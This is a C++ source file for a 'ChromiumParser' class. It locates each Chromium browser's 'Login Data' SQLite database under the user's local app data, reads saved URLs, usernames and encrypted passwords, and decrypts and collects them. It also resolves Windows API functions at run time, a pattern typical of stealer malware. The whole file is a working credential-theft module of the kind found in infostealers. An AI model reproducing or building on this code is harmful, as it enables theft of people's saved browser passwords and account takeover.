#include "ChromeParser.h"

#include <memory>
#include <sqlite3.h>
#include <Base64.h>
#include <cJSON.h>

#include "ChromeDecryptor.h"


ChromiumParser::~ChromiumParser()
{
	if (m_pbOutput)
		delete[] m_pbOutput;
}

List<AccountData> ChromiumParser::collect_data()
{
	for(const auto& browser : m_chromium_list)
	{
		try_collect(browser);	}

	return m_collected_data;
}

void ChromiumParser::try_collect(const String& chromium_path)
{

	List<AccountData> out_data;
	if (!get_path_to_db(chromium_path)) return;

	sqlite3* db;

	if (sqlite3_open(m_chrome_sqlite_path.c_str(), &db) != SQLITE_OK)
		return;


	sqlite3_stmt* stmt;
	if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, 0) != SQLITE_OK)
		return;

	int entries = 0;


	ChromeDecryptor decryptor;
	
	if (!decryptor.init(chromium_path)) return;


	if (!m_pbOutput)	
		m_pbOutput = new char[MAX_SIZE_PASS];
	

	while (sqlite3_step(stmt) == SQLITE_ROW)
	{

		AccountData user_data;

		char* url = (char*)sqlite3_column_text(stmt, 0);
		char* username = (char*)sqlite3_column_text(stmt, 1);
		char* password = (char*)sqlite3_column_text(stmt, 2);

		if (url == nullptr && username == nullptr && password == nullptr)
			break;
		if ((strlen(url) == 0) && (strlen(username) == 0) && (strlen(password) == 0))
			continue;

		if(url)
			user_data.Url = url;
		if (username)
			user_data.Username = username;
		
		decryptor.set_password_size(sqlite3_column_bytes(stmt, 2));

		String decrypted_password;
		
		if (decryptor.decrypt_data(password, decrypted_password))
			user_data.Password = decrypted_password;

		out_data.emplace_back(user_data);
		entries++;
	}

	for(const auto& item:  out_data)
	{
		m_collected_data.emplace_back(item);
	}
}


bool ChromiumParser::get_path_to_db(const String& chromium_path)
{
	const auto get_user_path = WinApiImport<f_SHGetFolderPathA>::get("SHGetFolderPathA", "shell32.dll");
	
	if (!get_user_path) return false;

	const int local_data_app = 0x001c;
	char _path[MAX_PATH];
	if(get_user_path(NULL, local_data_app, NULL, 0, _path) != S_OK) return false;
	m_chrome_sqlite_path = _path;
	m_chrome_sqlite_path += chromium_path +R"(\User Data\Default\Login Data)";
	return true;	
}


